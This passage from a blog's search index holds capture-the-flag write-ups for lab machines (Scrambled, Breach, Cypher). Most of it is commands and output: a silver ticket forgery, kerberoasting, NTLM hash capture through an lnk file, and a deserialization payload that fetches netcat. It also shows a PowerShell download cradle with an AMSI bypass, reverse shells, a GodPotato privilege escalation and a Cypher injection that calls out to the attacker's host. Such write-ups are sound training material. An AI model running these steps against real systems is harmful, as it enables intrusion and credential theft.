as the Administrator of the instance.\n```\n$ ticketer.py -nthash B990006500B87D000C70000A6877000 -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -user 'sqlsvc' -domain 'scrm.local' -spn 'MSSQL//dc1.scrm.local:1433' -user-id '500' Administrator\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in Administrator.ccache\n```\n![](/img/tickets.gif)\n\nThen we can export and connect to the MSSQL instance.\n```\n$ export KRB5CCNAME=Administrator.ccache\n$ impacket-mssqlclient -dc-ip 10.10.11.168 'scrm.local/Administrator@dc1.scrm.local' -k -no-pass -debug\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket\n[*] Encryption required, switching to TLS\n[+] Using Kerberos Cache: Administrator.ccache\n[+] SPN MSSQLSVC/:1433@SCRM.LOCAL not found in cache\n[+] AnySPN is True, looking for another suitable SPN\n[+] Returning cached credential for MSSQL/@SCRM.LOCAL\n[+] Using TGS from cache\n[+] Changing sname from MSSQL/@SCRM.LOCAL to MSSQLSVC/:1433@SCRM.LOCAL and hoping for the best\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC1): Line 1: Changed database context to 'master'.\n[*] INFO(DC1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (SCRM\\administrator  dbo@master)> \n```\nWinner Winner SQL Dinner!!!\n\n## MSSQL (Through the Looking Glass)\n\nWe can look through the database real quick to see if anything interesting is lingering about.\n```\nSQL (SCRM\\administrator  dbo@master)> select name from sys.databases;                                                                                            \nname                                                                                                  \n----------   \nmaster\n\ntempdb\n\nmodel\n\nmsdb\n\nScrambleHR\n\nSQL (SCRM\\administrator  dbo@master)> use ScrambleHR;\nENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR                                                                          \nINFO(DC1): Line 1: Changed database context to 'ScrambleHR'.\nSQL (SCRM\\administrator  dbo@ScrambleHR)> select name from sys.tables;\nname\n----------                                                                                            \nEmployees    \n\nUserImport                                                          \n                                                           \nTimesheets                                                          \nSQL (SCRM\\administrator  dbo@ScrambleHR)> select * from UserImport;\nLdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   \n--------   -----------------   ----------   ---------------   -------------   \nMiscSvc    <SNIP>   scrm.local                90               0 \n```\n![](/img/perfect.gif)\n\n## SMB I See\n\nUsing the new credentials we found for `MiscSvc`, lets look at shares again.\n```\n$ nxc smb dc1.scrm.local -k -u MiscSvc -p <SNIP> --shares\nSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)\nSMB         dc1.scrm.local  445    dc1              [+] scrm.local\\MiscSvc:<SNIP> \nSMB         dc1.scrm.local  445    dc1              [*] Enumerated shares\nSMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark\nSMB         dc1.scrm.local  445    dc1              -----           -----------     ------\nSMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin\nSMB         dc1.scrm.local  445    dc1              C$                              Default share\nSMB         dc1.scrm.local  445    dc1              HR                              \nSMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC\nSMB         dc1.scrm.local  445    dc1              IT              READ            \nSMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share \nSMB         dc1.scrm.local  445    dc1              Public          READ            \nSMB         dc1.scrm.local  445    dc1              Sales                           \nSMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share \n```\nWe have access to the `IT` share now. Looking inside we find a custom `exe` and `dll` file we can download and look at on our windows VM.\n```\n$ impacket-smbclient 'scrm.local/MiscSvc:<SNIP>@dc1.scrm.local' -k -no-pass\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\nType help for list of commands\n# use IT\n# ls\ndrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 .\ndrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 ..\ndrw-rw-rw-          0  Wed Nov  3 16:06:32 2021 Apps\ndrw-rw-rw-          0  Wed Nov  3 14:32:44 2021 Logs\ndrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 Reports\n# cd Apps\n# ls\ndrw-rw-rw-          0  Wed Nov  3 16:06:32 2021 .\ndrw-rw-rw-          0  Wed Nov  3 16:06:32 2021 ..\ndrw-rw-rw-          0  Fri Nov  5 15:57:08 2021 Sales Order Client\n# cd Sales Order Client\n# ls\ndrw-rw-rw-          0  Fri Nov  5 15:57:08 2021 .\ndrw-rw-rw-          0  Fri Nov  5 15:57:08 2021 ..\n-rw-rw-rw-      86528  Fri Nov  5 15:57:08 2021 ScrambleClient.exe\n-rw-rw-rw-      19456  Fri Nov  5 15:57:08 2021 ScrambleLib.dll\n# mget *\n```\n## Dnspying\n\nAfter getting the files on our windows VM we can look at them in [dnspy](https://github.com/dnSpy/dnSpy).\n\nFrom this we can load both the exe and dll. The dll will hold libraries which we can look at called `ScrambleLib`. Inside them we find a library showing us a certain username we can use to bypass authentication.\n![](/img/dnspy.png)\n\nUpon connecting with the domain we get the dashboard. Other tabs show a way to create a new order. We can enable debug logging from Tools so we get a output file we can read. Lets try to create an order and get output.\n\n![](/img/mainm.png)\n![](/img/debug1.png)\n![](/img/exe1.png)\n![](/img/neworder.png)\n\n### Making sense of the output\nWe see that we are send data to the server `LIST_ORDERS;`. Also base64 and deserialization is being used, as well as Binary Formatting. We see near the bottom, `UPLOAD_ORDER;` and then base64. If we rememeber from the very beginning there was port 4411 running that gave us feedback.\n![](/img/deout.png)\n\n## Back to Suite 4411 with Deserialization\n\n![](/img/serial.gif)\nWe can use [ysoserial](https://github.com/pwntester/ysoserial.net) to encode our payloads. First we can setup a python server hosting ncat.\n\n```\nWindows VM:\nPS C:\\Users\\jay\\Desktop\\Tools\\ysoserial-NET > .\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \"certutil -f -urlcache http://10.10.14.7/nc64.exe C:\\ProgramData\\nc.exe\"\n\nLinux VM:\n$ telnet 10.10.11.168 4411                                               \nTrying 10.10.11.168...\nConnected to 10.10.11.168.\nEscape character is '^]'.\nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;AAEAAAD/////<SNIP>\nERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.\nSESSION_TIMED_OUT;\n\n$ sudo python3 -m http.server 80 --directory /usr/share/windows-binaries/\n[sudo] password for jaybit:\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.168 - - [01/Apr/2025 10:43:28] \"GET /nc64.exe HTTP/1.1\" 200 -\n10.10.11.168 - - [01/Apr/2025 10:43:28] \"GET /nc64.exe HTTP/1.1\" 200 - \n```\n![](/img/great.gif)\nSo we got it to grab ncat. Now we can do the same thing and execute ncat now and once we do we get a shell back.\n```\n$ rlwrap nc -lvnp 9001                                                                                            \nlistening on [any] 9001 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 50224\nWindows PowerShell                                          \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32> whoami\nwhoami\nnt authority\\system           \n```\n\n![](/img/robocop.gif)","tags":["SMB","kerberoasting SPNs","silver ticket","mssql",".NET","Deserialization"],"categories":["htb"]},{"title":"Breach (Windows Medium)","url":"/2025/03/28/Breach/","content":"![](/img/breach.jpg)\n\nBreach is a Windows Medium box that starts with Guest auth to shares. Having read/write to one share, we upload a `lnk` file and receive a user hash. This hash is used to kerberoast SPNs which gets a hash for `svc_mssql` user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator to a MSSQL instance and can run commands via `xp_cmdshell`. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have `SeImpersonate` available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE       REASON          VERSION\n53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus\n80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 127\n464/tcp  open  kpasswd5?     syn-ack ttl 127\n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack ttl 127\n1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000\n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 127\n3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services\nService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\n## SMB\nTrying as `Guest` allows us access to the `share` on the DC.\n```\n$ nxc smb 10.10.92.126 -u Guest -p '' --shares\n\nSMB         10.10.92.126    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.10.92.126    445    BREACHDC         [+] breach.vl\\Guest: \nSMB         10.10.92.126    445    BREACHDC         [*] Enumerated shares\nSMB         10.10.92.126    445    BREACHDC         Share           Permissions     Remark\nSMB         10.10.92.126    445    BREACHDC         -----           -----------     ------\nSMB         10.10.92.126    445    BREACHDC         ADMIN$                          Remote Admin\nSMB         10.10.92.126    445    BREACHDC         C$                              Default share\nSMB         10.10.92.126    445    BREACHDC         IPC$            READ            Remote IPC\nSMB         10.10.92.126    445    BREACHDC         NETLOGON                        Logon server share \nSMB         10.10.92.126    445    BREACHDC         share           READ,WRITE      \nSMB         10.10.92.126    445    BREACHDC         SYSVOL                          Logon server share \nSMB         10.10.92.126    445    BREACHDC         Users           READ \n```\nWe have read/write to the share. Looking over it we see some directories we can access.\n```\nsmbmap -u Guest -p '' -d breach.vl -H 10.10.92.126 -R share\n[+] IP: 10.10.92.126:445        Name: breachdc.breach.vl                                \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        share                                                   READ, WRITE\n        .\\share\\*\n        dr--r--r--                0 Thu Mar 27 19:29:56 2025    .\n        dr--r--r--                0 Thu Feb 17 09:38:00 2022    ..\n        dr--r--r--                0 Thu Mar 27 19:25:05 2025    finance\n        dr--r--r--                0 Thu Feb 17 05:19:13 2022    software\n        dr--r--r--                0 Thu Mar 27 19:25:26 2025    transfer\n        .\\share\\finance\\*\n        dr--r--r--                0 Thu Mar 27 19:25:05 2025    .\n        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..\n        .\\share\\software\\*\n        dr--r--r--                0 Thu Mar 27 19:25:17 2025    .\n        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..\n        .\\share\\transfer\\*\n        dr--r--r--                0 Thu Mar 27 19:25:26 2025    .\n        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..\n        dr--r--r--                0 Thu Feb 17 05:23:51 2022    claire.pope\n        dr--r--r--                0 Thu Feb 17 05:23:22 2022    diana.pope\n        dr--r--r--                0 Thu Feb 17 05:24:39 2022    julia.wong\n\n```\n![](/img/perfect.gif)\n\n### NTLM Theft\n\nWe can drop and `scf or lnk` file and see if we can any clicks.\n```\n$ python3 ntlm_theft.py --generate lnk --server 10.8.4.29 --filename freeCandy\nCreated: freeCandy/freeCandy.lnk (BROWSE TO FOLDER)\nGeneration Complete.\n\n$ impacket-smbclient 'breach.vl/Guest@breach.vl' -no-pass\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\nType help for list of commands\n# shares                                                   \nADMIN$                                                     \nC$                                                         \nIPC$                                                       \nNETLOGON                                                   \nshare                                                      \nSYSVOL                                                     \nUsers                                                      \n# use share                                                \n# ls                                                       \ndrw-rw-rw-          0  Fri Mar 28 08:16:30 2025 .\ndrw-rw-rw-          0  Thu Feb 17 09:38:00 2022 ..\ndrw-rw-rw-          0  Thu Feb 17 05:19:36 2022 finance\ndrw-rw-rw-          0  Thu Feb 17 05:19:13 2022 software\ndrw-rw-rw-          0  Thu Feb 17 08:00:35 2022 transfer\n# cd transfer                                              \n# ls                                                       \ndrw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .\ndrw-rw-rw-          0  Fri Mar 28 08:16:30 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope \ndrw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope\ndrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong\n# put freeCandy.lnk                                        \n# exit\n```\nAnd we can put it in the `transfer` folder where the users are at. After we setup responder and see if we get a hit.\n```\n$ sudo responder -I tun0\n\n[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.10.92.126\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:0526add1eaef5104:1DD6932CED548FA48BD4BED2516A3E02:01010000000000008061771E4D9FDB018B3185DF3D296F610000000002000800570041004100560001001E00570049004E002D00360042003100300033004F00470059004D004B<SNIP>\n[*] Skipping previously captured hash for BREACH\\Julia.Wong \n```\n![](/img/yes.gif)\nOnce cracked, we can get a dump for bloodhound. After getting a list of users.\n```\n$ nxc smb breach.vl -u julia.wong -p <SNIP> --rid-brute | grep SidTypeUser | cut -d '\\' -f2 | awk '{print $1}' > users.list\n```\n\n## Kerberoasting\n\nFollowing general rule of thumb, when we have credentials we try kerberoasting. We can see if we have any SPNs associated with this user.\n```\n$ GetUserSPNs.py 'breach.vl/julia.wong:<SNIP>'         \nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation \n--------------------------------  ---------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             \n\n$ GetUserSPNs.py 'breach.vl/julia.wong:<SNIP>' -request-user svc_mssql\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation \n--------------------------------  ---------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             \n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$94460cab00e138498318d889ae9d858d$ebfbc9219ec245123242aa4a3b5408c548d7dd7afb1926b61936c422b74fed99f0414f59d3cad89f18afc227c4d0275048a11c91816eae8248d9fa69e1f30ccb77b76020f07ea4452f2af9352e1817f92a9758a4099e76402df858ecb54abb9f170179107dff4fb442b7a5437a348476398b0459<SNIP>\n```\nAnd we get a hit on `svc_mssql`, when we crack the hash we get a clear text cred we can use against the open port 1433/mssql.\n\n### Silver Ticket Attack\n\nSince we have valid credentials to a service account(MSSQL). We can create a `silver ticket` which will give us administrative rights when we connect to the mssql instance. If we did it now we wouldn't have the ability to run commands. \n```\n$ impacket-mssqlclient 'breach.vl/svc_mssql:<SNIP>@breach.vl' -windows-auth\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\svc_mssql  guest@master)> enable_xp_cmdshell\nERROR(BREACHDC\\SQLEXPRESS): Line 105: User does not have permission to perform this action.\nERROR(BREACHDC\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.\nERROR(BREACHDC\\SQLEXPRESS): Line 105: User does not have permission to perform this action.\nERROR(BREACHDC\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.\nSQL (BREACH\\svc_mssql  guest@master)>\n```\n![](/img/tickets.gif)\nSo we use `impacket-ticketer` to create our ticket. First we need to convert the password to a nthash with a converter online. Then we must get the domain sid. We can obtain that a couple of ways, using impacket tools such as `lookupsid`, `getPac`, `nxc`, bloodhound data. Then we create our ticket. Ensure to use `//` when entering the service or you will get an error when kerberos looks for the ticket. *This is in some cases, at least it was for me*\n```\n$ impacket-getPac 'breach.vl/svc_mssql:<SNIP>' -targetUser 'svc_mssql'\n<SNIP>\nResourceGroupDomainSid:          NULL           \nResourceGroupCount:              0                                                                                    \nResourceGroupIds:                NULL                                                                                 \nDomain SID: S-1-5-21-2330692793-3312915120-706255856 \n\n$ impacket-ticketer -nthash '0006C7AA1E800E17F8E78870E2000' -spn 'MSSQLSvc//breachdc.breach.vl:1433' -domain 'breach.vl' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -user-id '500' Administrator\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n                                                           \n[*] Creating basic skeleton ticket and PAC Infos \n[*] Customizing ticket for breach.vl/Administrator\n[*] PAC_LOGON_INFO \n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart                                \n[*] Signing/Encrypting final ticket    \n[*]     PAC_SERVER_CHECKSUM                             \n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in Administrator.ccache\n```\nAfter creation, we can export it and connect using kerberos.\n```\n$ export KRB5CCNAME=Administrator.ccache\n$ impacket-mssqlclient -dc-ip 10.10.112.98 -k -no-pass 'breach.vl/Administrator@breach.vl' -windows-auth -debug\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies \n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket\n[*] Encryption required, switching to TLS\n[+] Using Kerberos Cache: Administrator.ccache \n[+] SPN MSSQLSVC/:1433@BREACH.VL not found in cache       \n[+] AnySPN is True, looking for another suitable SPN   \n[+] Returning cached credential for MSSQLSVC/@BREACH.VL  \n[+] Using TGS from cache                                  \n[+] Changing sname from MSSQLSvc/@BREACH.VL to MSSQLSVC/:1433@BREACH.VL and hoping for the best\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english \n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Administrator  dbo@master)> \n```\nNow we can run a commands. After enabling xp_cmdshell we run the following with our listener up:\n```\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell echo IEX((New-Object Net.WebClient).DownloadString(\"http://10.8.4.29/a2.ps1\")) | powershell -noprofile\n---\n$ sudo python3 -m http.server 80                 \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.112.98 - - [28/Mar/2025 11:16:18] \"GET /a2.ps1 HTTP/1.1\" 200 -\n10.10.112.98 - - [28/Mar/2025 11:16:58] \"GET /cradle.ps1 HTTP/1.1\" 200 -\n10.10.112.98 - - [28/Mar/2025 11:16:59] \"GET /sm.ps1 HTTP/1.1\" 200 -\n```\n- `a2.ps1` is a AMSI-Bypass tha once finished will reach out again for the cradle.ps1\n- `cradle.ps1` will reach out again for the reverse shell.\n- `sm.ps1` is the full reverse shell. Nishang Oneliner.\n\n![](/img/crowd.gif)\nThis get us a reverse shell. Finally!!\n\n## PrivEsc\n\n```\n$ rlwrap nc -lvnp 9002                                                                           \nlistening on [any]9002 ...\nconnect to [10.8.4.29] from (UNKNOWN) [10.10.112.98]58767\nPS C:\\Windows\\system32> cd \\programdata\nPS C:\\programdata> ls\n```\nAfter looking at our privileges we can see our easy out.\n```\nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \n```\nTransfered GodPotato over and created a user and added them to the Administrators group.\n![](/img/potato.gif)\n```\nPS C:\\programdata> .\\GP.exe -cmd \"cmd /c net user das Password123! /add && net localgroup Administrators das /add\"\n[*] CombaseModule: 0x140728437833728\n[*] DispatchTable: 0x140728440424312\n[*] UseProtseqFunction: 0x140728439716656\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\3d715370-aea5-445c-99d8-44b10fe45380\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 0000a002-020c-ffff-8d0d-32b15ac3e33c\n[*] DCOM obj OXID: 0x5accc6eeede9cc5\n[*] DCOM obj OID: 0x3ea5b1981acb83fd\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 104 Token:0x756  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 2084\nThe command completed successfully.\n\nThe command completed successfully.\n```\nLets get on the system.\n```\n$ evil-winrm -i breach.vl -u das -p 'Password123!'\n\nEvil-WinRM shell v3.5\n                                                            \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\das\\Documents> whoami /all\n<SNIP>\nBUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\n<SNIP>\n```\n![](/img/robocop.gif)","tags":["ntlm theft","kerberoasting SPNs","silver ticket","mssql","amsi-bypass"],"categories":["vl"]},{"title":"Cypher (Linux Medium)","url":"/2025/03/14/Cypher/","content":"![](/img/cypher.png)\n\nCypher is a Linux Medium box that starts with a website hosting a `.jar` file. Once downloaded and decompiled you find amongst them a `CustomFunctions.class` java file. Using `jd-gui` we are able to look at the source code of the file. The code reveals a attack vector inside a string that executes a system command. Using [Cypher Injection](https://hackmd.io/@Chivato/rkAN7Q9NY) we are able to obtain a reverse shell that gets us on the box as `neo4j`. Once on the box we look around to find a `.yml` file containing credentials. Trying with the other user gets us a shell as `graphasm`. We ssh in for stability, and check what permissions we have with `sudo -l` that reveals we can run `bbot` with sudo. Looking into the github and the man pages. We can force run a config through a dry run and have it abort before executing. Doing this we can obtain the `root.txt` file. \n\n## Initial Nmap\n```\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=\n|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi\n80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Did not follow redirect to http://cypher.htb/\n|_http-server-header: nginx/1.24.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n## HTTP\nLooking around we don't see much interesting, therefore we can gobuster and see what's hiding. \n\n\n`/api` is interesting enough, when we scan that we only see one endpoint.\n```\n$gobuster dir -u http://cypher.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt\n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://cypher.htb/api/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/auth                 (Status: 405) [Size: 31]\n```\nI presume this is an endpoint looking for authentication, therefore a `POST` request with something like `username:password`.\n\n### API Endpoint\n![](/img/facepalm.gif)\nSending a GET Request only provided a response in JSON telling us duhhh, most likely wants a POST Request for authentication. Also be weary as it could redirected us to `/api/api/auth`, so we need to remember to send our POST to `/api/auth`. \n\n![](/img/burp1.png)\n\nWonder if we can cause an error?? We can try a [payload](https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/) to see if we can get a neo4j version. Maybe we can get it to hit our server, yet fortnately we got an error which helps as well as and the version at the bottom I assuming.\n\n![](/img/burp2.png)\n```\nHTTP/1.1 400 Bad Request\nServer: nginx/1.24.0 (Ubuntu)\nDate: Fri, 14 Mar 2025 16:03:22 GMT\nContent-Length: 3257\nConnection: keep-alive\n\nTraceback (most recent call last):\n  File \"/app/app.py\", line 142, in verify_creds\n    results = run_cypher(cypher)\n  File \"/app/app.py\", line 63, in run_cypher\n    return [r.data() for r in session.run(cypher)]\n  File \"/app/app.py\", line 63, in <listcomp>\n    return [r.data() for r in session.run(cypher)]\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py\", line 378, in __iter__\n    self._connection.fetch_message()\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py\", line 178, in inner\n    func(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py\", line 860, in fetch_message\n    res = self._process_message(tag, fields)\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py\", line 370, in _process_message\n    response.on_failure(summary_metadata or {})\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py\", line 245, in on_failure\n    raise Neo4jError.hydrate(**metadata)\nneo4j.exceptions.ClientError: {code: Neo.ClientError.Statement.ExternalResourceFailed} {message: Invalid URL 'http://10.10.14.8/?version=5.24.1&name=Neo4j Kernel&edition=community': Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&name=Neo4j Kernel&edition=community ()}\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/app/app.py\", line 165, in login\n    creds_valid = verify_creds(username, password)\n  File \"/app/app.py\", line 151, in verify_creds\n    raise ValueError(f\"Invalid cypher query: {cypher}: {traceback.format_exc()}\")\nValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.8/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //' return h.value as hash: Traceback (most recent call last):\n  File \"/app/app.py\", line 142, in verify_creds\n    results = run_cypher(cypher)\n  File \"/app/app.py\", line 63, in run_cypher\n    return [r.data() for r in session.run(cypher)]\n  File \"/app/app.py\", line 63, in <listcomp>\n    return [r.data() for r in session.run(cypher)]\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py\", line 378, in __iter__\n    self._connection.fetch_message()\n  File 